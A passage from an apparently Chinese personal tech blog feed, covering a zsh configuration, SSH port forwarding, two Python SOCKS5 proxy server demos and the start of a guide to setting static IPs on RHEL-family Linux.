class="string">&#x27;:completion:*:*:kill:*:processes&#x27;</span> list-colors <span class="string">&#x27;=(#b) #([0-9]#)*=0=01;31&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># some more ls aliases</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -l&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable auto-suggestions based on the history</span></span><br><span class="line"><span class="keyword">if</span> [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; <span class="keyword">then</span></span><br><span class="line">    . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh</span><br><span class="line">    <span class="comment"># change suggestion color</span></span><br><span class="line">    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=<span class="string">&#x27;fg=#999&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable command-not-found if installed</span></span><br><span class="line"><span class="keyword">if</span> [ -f /etc/zsh_command_not_found ]; <span class="keyword">then</span></span><br><span class="line">    . /etc/zsh_command_not_found</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>安装zsh，替换zshrc，设置默认shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install zsh zsh-syntax-highlighting zsh-autosuggestions -y</span><br><span class="line"><span class="built_in">cp</span> kali.zshrc ~/.zshrc &amp;&amp; <span class="built_in">sudo</span> <span class="built_in">cp</span> kali.zshrc /root/.zshrc</span><br><span class="line">chsh -s /usr/bin/zsh &amp;&amp; <span class="built_in">sudo</span> chsh -s /usr/bin/zsh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 主题美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各类转发软件</title>
      <link href="/2022/05/27/Tools/proxy/"/>
      <url>/2022/05/27/Tools/proxy/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h1><p>加密转发技术之一，优点在于有ssh就能用</p><h2 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h2><p><img src="/2022/05/27/Tools/proxy/local_forward.jpg" alt="场景图解"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L local_port:target_ip:target_port remote_server -N <span class="comment"># -N参数表示不启动远端shell</span></span><br></pre></td></tr></table></figure><h2 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h2><p><img src="/2022/05/27/Tools/proxy/remote_forward.jpg" alt="场景图解"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R remote_port:target_ip:target_port remote_server -N <span class="comment"># -N参数表示不启动远端shell</span></span><br></pre></td></tr></table></figure><h2 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h2><p><img src="/2022/05/27/Tools/proxy/dynamic_forward.jpg" alt="场景图解"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D local_port remote_server -N <span class="comment"># -N参数表示不启动远端shell</span></span><br></pre></td></tr></table></figure><h1 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h1><blockquote><p>一个开源的代理转发协议，支持TCP&#x2F;UDP转发</p></blockquote><p>协议详解参见<a href="https://hatboy.github.io/2018/04/28/Python%E7%BC%96%E5%86%99socks5%E6%9C%8D%E5%8A%A1%E5%99%A8/">HatBoy</a></p><p>实现不算太复杂，目前较好的实现：</p><p>Python3：<a href="https://raw.githubusercontent.com/fengyouchao/pysocks/master/socks5.py">Github pysocks</a></p><p>HatBoy的demo示例代码：</p><ul><li>无密码认证</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> StreamRequestHandler, ThreadingTCPServer</span><br><span class="line">SOCKS_VERSION = <span class="number">5</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SocksProxy</span>(<span class="title class_ inherited__">StreamRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Accepting connection from &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>.client_address))</span><br><span class="line">        <span class="comment"># 协商</span></span><br><span class="line">        <span class="comment"># 从客户端读取并解包两个字节的数据</span></span><br><span class="line">        header = <span class="variable language_">self</span>.connection.recv(<span class="number">2</span>)</span><br><span class="line">        version, nmethods = struct.unpack(<span class="string">&quot;!BB&quot;</span>, header)</span><br><span class="line">        <span class="comment"># 设置socks5协议，METHODS字段的数目大于0</span></span><br><span class="line">        <span class="keyword">assert</span> version == SOCKS_VERSION</span><br><span class="line">        <span class="keyword">assert</span> nmethods &gt; <span class="number">0</span></span><br><span class="line">        <span class="comment"># 接受支持的方法</span></span><br><span class="line">        methods = <span class="variable language_">self</span>.get_available_methods(nmethods)</span><br><span class="line">        <span class="comment"># 无需认证</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">set</span>(methods):</span><br><span class="line">            <span class="variable language_">self</span>.server.close_request(<span class="variable language_">self</span>.request)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># 发送协商响应数据包</span></span><br><span class="line">        <span class="variable language_">self</span>.connection.sendall(struct.pack(<span class="string">&quot;!BB&quot;</span>, SOCKS_VERSION, <span class="number">0</span>))</span><br><span class="line">        <span class="comment"># 请求</span></span><br><span class="line">        version, cmd, _, address_type = struct.unpack(<span class="string">&quot;!BBBB&quot;</span>, <span class="variable language_">self</span>.connection.recv(<span class="number">4</span>))</span><br><span class="line">        <span class="keyword">assert</span> version == SOCKS_VERSION</span><br><span class="line">        <span class="keyword">if</span> address_type == <span class="number">1</span>:  <span class="comment"># IPv4</span></span><br><span class="line">            address = socket.inet_ntoa(<span class="variable language_">self</span>.connection.recv(<span class="number">4</span>))</span><br><span class="line">        <span class="keyword">elif</span> address_type == <span class="number">3</span>:  <span class="comment"># Domain name</span></span><br><span class="line">            domain_length = <span class="variable language_">self</span>.connection.recv(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">            address = <span class="variable language_">self</span>.connection.recv(domain_length)</span><br><span class="line">            <span class="comment">#address = socket.gethostbyname(address.decode(&quot;UTF-8&quot;))  # 将域名转化为IP，这一行可以去掉</span></span><br><span class="line">        <span class="keyword">elif</span> address_type == <span class="number">4</span>: <span class="comment"># IPv6</span></span><br><span class="line">            addr_ip = <span class="variable language_">self</span>.connection.recv(<span class="number">16</span>)</span><br><span class="line">            address = socket.inet_ntop(socket.AF_INET6, addr_ip)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.server.close_request(<span class="variable language_">self</span>.request)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        port = struct.unpack(<span class="string">&#x27;!H&#x27;</span>, <span class="variable language_">self</span>.connection.recv(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 响应，只支持CONNECT请求</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> cmd == <span class="number">1</span>:  <span class="comment"># CONNECT</span></span><br><span class="line">                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                remote.connect((address, port))</span><br><span class="line">                bind_address = remote.getsockname()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Connected to &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(address, port))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>.server.close_request(<span class="variable language_">self</span>.request)</span><br><span class="line">            addr = struct.unpack(<span class="string">&quot;!I&quot;</span>, socket.inet_aton(bind_address[<span class="number">0</span>]))[<span class="number">0</span>]</span><br><span class="line">            port = bind_address[<span class="number">1</span>]</span><br><span class="line">            <span class="comment">#reply = struct.pack(&quot;!BBBBIH&quot;, SOCKS_VERSION, 0, 0, address_type, addr, port)</span></span><br><span class="line">            <span class="comment"># 注意：按照标准协议，返回的应该是对应的address_type，但是实际测试发现，当address_type=3，也就是说是域名类型时，会出现卡死情况，但是将address_type该为1，则不管是IP类型和域名类型都能正常运行</span></span><br><span class="line">            reply = struct.pack(<span class="string">&quot;!BBBBIH&quot;</span>, SOCKS_VERSION, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, addr, port)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            logging.error(err)</span><br><span class="line">            <span class="comment"># 响应拒绝连接的错误</span></span><br><span class="line">            reply = <span class="variable language_">self</span>.generate_failed_reply(address_type, <span class="number">5</span>)</span><br><span class="line">        <span class="variable language_">self</span>.connection.sendall(reply)</span><br><span class="line">        <span class="comment"># 建立连接成功，开始交换数据</span></span><br><span class="line">        <span class="keyword">if</span> reply[<span class="number">1</span>] == <span class="number">0</span> <span class="keyword">and</span> cmd == <span class="number">1</span>:</span><br><span class="line">            <span class="variable language_">self</span>.exchange_loop(<span class="variable language_">self</span>.connection, remote)</span><br><span class="line">        <span class="variable language_">self</span>.server.close_request(<span class="variable language_">self</span>.request)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_available_methods</span>(<span class="params">self, n</span>):</span><br><span class="line">        methods = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            methods.append(<span class="built_in">ord</span>(<span class="variable language_">self</span>.connection.recv(<span class="number">1</span>)))</span><br><span class="line">        <span class="keyword">return</span> methods</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_failed_reply</span>(<span class="params">self, address_type, error_number</span>):</span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">&quot;!BBBBIH&quot;</span>, SOCKS_VERSION, error_number, <span class="number">0</span>, address_type, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exchange_loop</span>(<span class="params">self, client, remote</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 等待数据</span></span><br><span class="line">            r, w, e = select.select([client, remote], [], [])</span><br><span class="line">            <span class="keyword">if</span> client <span class="keyword">in</span> r:</span><br><span class="line">                data = client.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">if</span> remote.send(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> remote <span class="keyword">in</span> r:</span><br><span class="line">                data = remote.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">if</span> client.send(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 使用socketserver库的多线程服务器ThreadingTCPServer启动代理</span></span><br><span class="line">    <span class="keyword">with</span> ThreadingTCPServer((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9011</span>), SocksProxy) <span class="keyword">as</span> server:</span><br><span class="line">        server.serve_forever()</span><br></pre></td></tr></table></figure><ul><li>密码认证</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> StreamRequestHandler, ThreadingTCPServer</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line">SOCKS_VERSION = <span class="number">5</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SocksProxy</span>(<span class="title class_ inherited__">StreamRequestHandler</span>):</span><br><span class="line">    username = <span class="string">&#x27;username&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;password&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        logging.info(<span class="string">&#x27;Accepting connection from %s:%s&#x27;</span> % <span class="variable language_">self</span>.client_address)</span><br><span class="line">        <span class="comment"># 协商</span></span><br><span class="line">        <span class="comment"># 从客户端读取并解包两个字节的数据</span></span><br><span class="line">        header = <span class="variable language_">self</span>.connection.recv(<span class="number">2</span>)</span><br><span class="line">        version, nmethods = struct.unpack(<span class="string">&quot;!BB&quot;</span>, header)</span><br><span class="line">        <span class="comment"># 设置socks5协议，METHODS字段的数目大于0</span></span><br><span class="line">        <span class="keyword">assert</span> version == SOCKS_VERSION</span><br><span class="line">        <span class="keyword">assert</span> nmethods &gt; <span class="number">0</span></span><br><span class="line">        <span class="comment"># 接受支持的方法</span></span><br><span class="line">        methods = <span class="variable language_">self</span>.get_available_methods(nmethods)</span><br><span class="line">        <span class="comment"># 检查是否支持用户名/密码认证方式，不支持则断开连接</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">2</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">set</span>(methods):</span><br><span class="line">            <span class="variable language_">self</span>.server.close_request(<span class="variable language_">self</span>.request)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># 发送协商响应数据包</span></span><br><span class="line">        <span class="variable language_">self</span>.connection.sendall(struct.pack(<span class="string">&quot;!BB&quot;</span>, SOCKS_VERSION, <span class="number">2</span>))</span><br><span class="line">        <span class="comment"># 校验用户名和密码</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.verify_credentials():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># 请求</span></span><br><span class="line">        version, cmd, _, address_type = struct.unpack(<span class="string">&quot;!BBBB&quot;</span>, <span class="variable language_">self</span>.connection.recv(<span class="number">4</span>))</span><br><span class="line">        <span class="keyword">assert</span> version == SOCKS_VERSION</span><br><span class="line">        <span class="keyword">if</span> address_type == <span class="number">1</span>:  <span class="comment"># IPv4</span></span><br><span class="line">            address = socket.inet_ntoa(<span class="variable language_">self</span>.connection.recv(<span class="number">4</span>))</span><br><span class="line">        <span class="keyword">elif</span> address_type == <span class="number">3</span>:  <span class="comment"># 域名</span></span><br><span class="line">            domain_length = <span class="variable language_">self</span>.connection.recv(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">            address = <span class="variable language_">self</span>.connection.recv(domain_length)</span><br><span class="line">        <span class="keyword">elif</span> address_type == <span class="number">4</span>: <span class="comment"># IPv6</span></span><br><span class="line">            addr_ip = <span class="variable language_">self</span>.connection.recv(<span class="number">16</span>)</span><br><span class="line">            address = socket.inet_ntop(socket.AF_INET6, addr_ip)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.server.close_request(<span class="variable language_">self</span>.request)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        port = struct.unpack(<span class="string">&#x27;!H&#x27;</span>, <span class="variable language_">self</span>.connection.recv(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 响应，只支持CONNECT请求</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> cmd == <span class="number">1</span>:  <span class="comment"># CONNECT</span></span><br><span class="line">                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                remote.connect((address, port))</span><br><span class="line">                bind_address = remote.getsockname()</span><br><span class="line">                logging.info(<span class="string">&#x27;Connected to %s %s&#x27;</span> % (address, port))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>.server.close_request(<span class="variable language_">self</span>.request)</span><br><span class="line">            addr = struct.unpack(<span class="string">&quot;!I&quot;</span>, socket.inet_aton(bind_address[<span class="number">0</span>]))[<span class="number">0</span>]</span><br><span class="line">            port = bind_address[<span class="number">1</span>]</span><br><span class="line">            reply = struct.pack(<span class="string">&quot;!BBBBIH&quot;</span>, SOCKS_VERSION, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, addr, port)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            logging.error(err)</span><br><span class="line">            <span class="comment"># 响应拒绝连接的错误</span></span><br><span class="line">            reply = <span class="variable language_">self</span>.generate_failed_reply(address_type, <span class="number">5</span>)</span><br><span class="line">        <span class="variable language_">self</span>.connection.sendall(reply)</span><br><span class="line">        <span class="comment"># 建立连接成功，开始交换数据</span></span><br><span class="line">        <span class="keyword">if</span> reply[<span class="number">1</span>] == <span class="number">0</span> <span class="keyword">and</span> cmd == <span class="number">1</span>:</span><br><span class="line">            <span class="variable language_">self</span>.exchange_loop(<span class="variable language_">self</span>.connection, remote)</span><br><span class="line">        <span class="variable language_">self</span>.server.close_request(<span class="variable language_">self</span>.request)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_available_methods</span>(<span class="params">self, n</span>):</span><br><span class="line">        methods = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            methods.append(<span class="built_in">ord</span>(<span class="variable language_">self</span>.connection.recv(<span class="number">1</span>)))</span><br><span class="line">        <span class="keyword">return</span> methods</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_credentials</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;校验用户名和密码&quot;&quot;&quot;</span></span><br><span class="line">        version = <span class="built_in">ord</span>(<span class="variable language_">self</span>.connection.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">assert</span> version == <span class="number">1</span></span><br><span class="line">        username_len = <span class="built_in">ord</span>(<span class="variable language_">self</span>.connection.recv(<span class="number">1</span>))</span><br><span class="line">        username = <span class="variable language_">self</span>.connection.recv(username_len).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        password_len = <span class="built_in">ord</span>(<span class="variable language_">self</span>.connection.recv(<span class="number">1</span>))</span><br><span class="line">        password = <span class="variable language_">self</span>.connection.recv(password_len).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username == <span class="variable language_">self</span>.username <span class="keyword">and</span> password == <span class="variable language_">self</span>.password:</span><br><span class="line">            <span class="comment"># 验证成功, status = 0</span></span><br><span class="line">            response = struct.pack(<span class="string">&quot;!BB&quot;</span>, version, <span class="number">0</span>)</span><br><span class="line">            <span class="variable language_">self</span>.connection.sendall(response)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="comment"># 验证失败, status != 0</span></span><br><span class="line">        response = struct.pack(<span class="string">&quot;!BB&quot;</span>, version, <span class="number">0xFF</span>)</span><br><span class="line">        <span class="variable language_">self</span>.connection.sendall(response)</span><br><span class="line">        <span class="variable language_">self</span>.server.close_request(<span class="variable language_">self</span>.request)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_failed_reply</span>(<span class="params">self, address_type, error_number</span>):</span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">&quot;!BBBBIH&quot;</span>, SOCKS_VERSION, error_number, <span class="number">0</span>, address_type, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exchange_loop</span>(<span class="params">self, client, remote</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 等待数据</span></span><br><span class="line">            r, w, e = select.select([client, remote], [], [])</span><br><span class="line">            <span class="keyword">if</span> client <span class="keyword">in</span> r:</span><br><span class="line">                data = client.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">if</span> remote.send(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> remote <span class="keyword">in</span> r:</span><br><span class="line">                data = remote.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">if</span> client.send(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 使用socketserver库的多线程服务器ThreadingTCPServer启动代理</span></span><br><span class="line">    <span class="keyword">with</span> ThreadingTCPServer((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9011</span>), SocksProxy) <span class="keyword">as</span> server:</span><br><span class="line">        server.serve_forever()</span><br></pre></td></tr></table></figure><h1 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h1><p>参见<a href="https://github.com/fatedier/frp">Github fatedier&#x2F;frp</a>，<a href="https://gofrp.org/">frp官方中文文档</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux主流发行版配置IP</title>
      <link href="/2022/05/19/Network/linux_set_ip/"/>
      <url>/2022/05/19/Network/linux_set_ip/</url>
      
        <content type="html"><![CDATA[<h1 id="network-service-RHEL系"><a href="#network-service-RHEL系" class="headerlink" title="network.service(RHEL系)"></a>network.service(RHEL系)</h1><blockquote><p>适用于centos&#x2F;redhat</p></blockquote><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p><code>/etc/sysconfig/network-scripts/ifcfg-eth0</code></p><blockquote><p>对应服务为network.service，可以通过<code>yum install network-scripts</code>来安装传统的network.service，不过redhat说，在下一个rhel的大版本里将彻底废除，因此不建议使用network.service</p></blockquote><p><code>ifcfg-eth0</code>常见内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">HWADDR=&quot;52:54:00:6f:bb:05&quot;</span><br><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line">DEFROUTE=&quot;yes&quot;</span><br><span class="line">PEERDNS=&quot;yes&quot;</span><br><span class="line">PEERROUTES=&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">IPV6_AUTOCONF=&quot;yes&quot;</span><br><span class="line">IPV6_DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV6_PEERDNS=&quot;yes&quot;</span><br><span class="line">IPV6_PEERROUTES=&quot;yes&quot;</span><br><span class="line">IPV6_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">NAME=&quot;eth0&quot;</span><br><span class="line">UUID=&quot;d2278821-f0e9-48b4-8b3f-24768d51765d&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br><span class="line">IPADDR=192.168.1.12</span><br><span class="line">GATEWAY=192.168.1.1</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">DNS1=192.168.1.1</span><br></pre></td></tr></table></figure><h2 id="配置参数说明"><a href="#配置参数说明" class="headerlink" 